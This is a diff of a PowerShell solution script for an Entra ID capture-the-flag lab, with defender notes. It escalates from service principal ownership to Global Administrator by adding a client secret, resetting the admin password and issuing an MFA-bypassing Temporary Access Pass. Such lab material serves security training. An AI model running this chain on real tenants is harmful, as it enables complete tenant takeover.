@@ -1,32 +1,33 @@
 <#
 .SYNOPSIS
 EntraGoat Scenario 1: Walkthrough step-by-step solution
-This can be done from the UI as well, this script automates the process
 
 .DESCRIPTION
 ________________________________________________________________________________________________________________________________________________
-Scenario 1 - Exploiting Service Principal (SP) Ownership for Privilege Escalation
+Scenario 1 - "Misowned and Dangerous: An Owner's Manual to Global Admin"
+
+Official blog post: https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/
 
 Attack flow: 
 
-1. The attacker starts as a low-privileged Entra ID user. 
-Thanks to a misconfiguration, this user is listed as an owner of a SP - as well-thought-out as giving a goat a chainsaw and asking it to 'trim just the hedges'.
+1. The attacker starts as a low-privileged Entra ID user (finance user david.martinez). 
+Thanks to a misconfiguration, this user is listed as an owner of a service principal - as well-thought-out as giving a goat a chainsaw and asking it to 'trim just the hedges'.
 
 2. Because SP owners can manage credentials, the attacker adds a new client secret to it. 
 No approval, no alert - yep, completely valid behavior from the platform's perspective.
 
-3. Using the newly added secret and SP object ID, the attacker authenticates as the SP. 
-The low-priv user is now wearing a much fancier hat.
+3. Using the newly added secret and SP App ID, the attacker authenticates as the SP using app-only flow. 
+The low-priv user is now wearing a much fancier hat with broader privilege boundaries.
 
 4. The SP has the Privileged Authentication Administrator (PAA) role. 
-This role allows resetting passwords for sensitive accounts, including Global Administrators (GA). Yes, really.
+This role allows resetting any authentication method (including passwords) for any user, including Global Administrators (GA). Yes, really.
 
-5. Resetting the Global Admin's Password
-With the PAA privileges, the attacker resets the password of a Global Administrator.
+5. Resetting the Global Admin's Password or Adding TAP
+With the PAA privileges, the attacker resets the password of a GA or adds a Temporary Access Pass (TAP) to bypass MFA.
 No phishing, no persistence tricks - just raw role power obtained through a misconfigured ownership chain.
 
 6. Taking Over the Admin Account
-The attacker logs in with the freshly reset Global Admin password and assumes full control of the tenant.
+The attacker logs in with the freshly reset GA password or TAP and assumes full control of the tenant.
 While the access is technically legitimate, it's far from invisible - logs will show the password reset event, the sign-in IP, device fingerprint, and more.
 
 From a defender's perspective, these are plenty breadcrumbs to follow:
@@ -45,12 +46,14 @@ Low-priv users might own SPs if:
 * A multi-tenant app was consented to and they were assigned as owners
 
 This scenario highlights how minor misconfigurations, like unchecked SP ownership, can snowball into major breaches when owner list audits are neglected.
+The key distinction here is between delegated (user context) and app-only (service principal context) authentication flows and their different security boundaries.
 ________________________________________________________________________________________________________________________________________________
 
 .NOTES
 Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
 you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
 #>
+
 
 function Find-OwnedServicePrincipals {
     param([string]$UserId)
@@ -75,7 +78,7 @@ function Find-OwnedServicePrincipals {
                 foreach ($owner in $owners) {
                     if ($owner.Id -eq $UserId) {
                         $ownedSPs += $sp
-                        Write-Host "OWNED SERVICE PRINCIPAL FOUND!" -ForegroundColor Red
+                        Write-Host "OWNED SERVICE PRINCIPAL FOUND!" -ForegroundColor DarkYellow
                         Write-Host "   Name: $($sp.DisplayName)" -ForegroundColor Yellow
                         Write-Host "   SP ID: $($sp.Id)" -ForegroundColor Yellow
                         Write-Host "   App ID: $($sp.AppId)" -ForegroundColor Yellow
@@ -119,53 +122,87 @@ $UPN = "david.martinez@[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
 $password = "GoatAccess!123"
 
 
-# Step 1: Authenticate as the low-privileged user using BARK function
-$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
-$userAccessToken = $userToken.access_token
-$SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
-Connect-MgGraph -AccessToken $SecureToken
+# Step 1: Initial foothold - Authenticating as the compromised user
+Connect-MgGraph
+
+# We could also use third-party enumeration tools such as BARK, GraphRunner, ROADtools, and AADInternals. For simplicity, we will use BARK’s Get-MSGraphTokenWithUsernamePassword function to acquire a delegated graph token via ROPC.
+# . .\BARK.ps1 
+# $userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
+# $userAccessToken = $userToken.access_token
+# $SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
+# Connect-MgGraph -AccessToken $SecureToken
 
 # Verify authentication and context
 Get-MgContext
 
-# for a much more detailed security context we can decode the JWT token issued to us with Parse-JWTToken function from BARK
+# For a more detailed security context we can decode the JWT token issued to us with Parse-JWTToken function from BARK
+# This shows delegated permissions (scp), directory roles (wids), authentication method (amr), etc.
 # Parse-JWTToken -Token $userAccessToken
 
 # Step 2: Enumeration 
+# Since this is the first scenario in the EntraGoat series, we’ll walk through the enumeration process and highlight foundational privilege escalation techniques. In our other scenarios, we’ll assume this baseline and focus directly on the core attack path, skipping the CTF-style reconnaissance steps.
+
 # Get current user details
 $currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
 $currentUser
 
+# Check for directory roles (should be empty for this scenario)
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId
 
-# Find service principals owned by current user
-$ownedSPs = Find-OwnedServicePrincipals -UserId $currentUser.Id
-
-# Check what roles each owned service principal has
-foreach ($sp in $ownedSPs) {
-    $roles = Get-ServicePrincipalRoles -ServicePrincipal $sp
+# Check group memberships (should only show default tenant group)
+$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
+foreach ($group in $groupIDs) {
+    Get-MgGroup -GroupId $group.Id
 }
 
-# Save the SP object ID
-$targetSPId = $ownedSPs | Where-Object { $_.DisplayName -eq "HR Analytics Dashboard"} | Select-Object -First 1 -ExpandProperty Id
+# Check for owned groups (should be empty)
+Get-MgGroup -All | Where-Object {
+    (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
+} 
 
-# Step 3: Since we own the SP, we can add a secret to it
+# Check for owned service principals (should find 1 - "Finance Analytics Dashboard SP")
+Get-MgServicePrincipal -All | Where-Object {
+    (Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
+}
+
+# Check if the owned SP has any assigned permissions (it doesn't)
+$SP = Get-MgServicePrincipal -Filter "displayName eq 'Finance Analytics Dashboard'"
+Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id | ForEach-Object {
+    Get-MgAppRole -AppRoleId $_.AppRoleId
+}
+
+# Check if the owned SP has any directory role assignments (it does - Privileged Authentication Administrator)
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($SP.Id)'" | ForEach-Object {
+    Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+}
+
+# To improve usability we can write simple wrapper functions such as Find-OwnedServicePrincipals and Get-ServicePrincipalRoles that are designed to automate the discovery of SP ownership and resolve directory role assignments more efficiently like other enumeration tools do:
+$ownedSPs = Find-OwnedServicePrincipals -UserId $currentUser.Id
+foreach ($ownedsp in $ownedSPs) {
+    Get-ServicePrincipalRoles -ServicePrincipal $ownedsp
+}
+
+# Step 3: Pivoting into the service principal's context
+# Since we own the SP, we can add a secret to it
 $secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $passwordCredential = @{
     DisplayName = $secretDescription
     EndDateTime = (Get-Date).AddYears(1)
 }
 
-$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSPId -PasswordCredential $passwordCredential
+$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $SP.Id -PasswordCredential $passwordCredential
 
 # Save the added secret details
 $clientSecret = $newSecret.SecretText
 
-# Disconnect current session 
+$tenantId = (Get-MgOrganization).Id
+
+# Disconnect current user session 
 Disconnect-MgGraph
 
-# Step 4: Authenticate as the SP
+# Step 4: Authenticate as the SP using app-only flow
 $secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
-$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $clientId, $secureSecret
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $SP.AppId, $secureSecret
 Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential
 
 # Verify SP authentication
@@ -174,7 +211,8 @@ Get-MgContext
 # Find the admin user details
 $targetAdmin = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s1')"
 
-# Step 5: We have the SP role of Privileged Authentication Administrator, so we can reset the admin password, right?
+# Step 5: Account takeover
+# We have the role of Privileged Authentication Administrator, so we can reset the admin password, right?
 $newAdminPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
 $passwordProfile = @{
     Password = $newAdminPassword
@@ -184,20 +222,20 @@ $passwordProfile = @{
 Update-MgUser -UserId $targetAdmin.Id -PasswordProfile $passwordProfile
 $newAdminPassword
 
-# We can even add authentication methods of Temporary Access Pass if needed 
-# $tempAccessPass = @{
-#     "@odata.type" = "#microsoft.graph.temporaryAccessPassAuthenticationMethod"
-#     "lifetimeInMinutes" = 60
-#     "isUsableOnce" = $false
-# }
-# $TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
-# $TAP.TemporaryAccessPass
+# Alternative: Temporary Access Pass (TAP) is a time-limited passcode that can be used to authenticate without MFA. We can set TAP for the GA to bypass current MFA requirements and sign in directly to the Azure portal with it. 
+$tempAccessPass = @{
+     "@odata.type" = "#microsoft.graph.temporaryAccessPassAuthenticationMethod"
+     "lifetimeInMinutes" = 60
+     "isUsableOnce" = $false
+ }
+$TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
+$TAP.TemporaryAccessPass
 # log in as the admin user with the TAP to Azure Portal 
 
 # Disconnect SP session
 Disconnect-MgGraph
 
-# Step 6: Authenticate as the compromised admin
+# Step 6: Authenticate as the compromised admin with BARK
 $adminToken = Get-MSGraphTokenWithUsernamePassword -Username $targetAdmin.UserPrincipalName -Password $newAdminPassword -TenantID $tenantId
 $adminAccessToken = $adminToken.access_token
 $SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
@@ -211,7 +249,7 @@ Get-MgContext
 #                VS
 # Parse-JWTToken -Token $adminAccessToken
 
-# Step 7: Retrieve flag
+# Step 7: Retrieve flag - demonstrating full tenant compromise
 Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
     Select-Object @{n='UPN';e={$_.userPrincipalName}},
                   @{n='Id';e={$_.id}},
@@ -220,5 +258,8 @@ Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userP
 # Disconnect admin session
 Disconnect-MgGraph
 
+# Congratulations! You have successfully completed the EntraGoat Scenario 1.
+# Don't forget to run the cleanup script to restore the tenant to it's original state!
 
 # To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the source code for EntraGoat Scenario 1.
+# Official blog post: https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/
